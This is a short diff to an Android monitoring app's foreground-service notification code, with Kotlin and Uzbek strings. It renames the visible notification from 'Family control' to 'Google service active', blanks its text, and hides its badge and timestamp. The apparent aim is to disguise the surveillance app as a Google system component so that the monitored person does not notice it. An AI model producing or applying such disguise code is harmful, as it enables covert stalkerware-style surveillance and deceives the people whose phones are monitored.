@@ -76,15 +76,18 @@ class MonitorForegroundService : Service() {
     private fun buildNotification(): Notification {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
-                CHANNEL_ID, "Oila nazorati", NotificationManager.IMPORTANCE_MIN
+                CHANNEL_ID, "Google xizmati", NotificationManager.IMPORTANCE_MIN
             )
+            channel.setShowBadge(false)
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Oila nazorati ishlamoqda")
+            .setContentTitle("Google xizmati faol")
+            .setContentText(" ")
             .setSmallIcon(R.drawable.ic_shield)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setShowWhen(false)
             .build()
     }
 
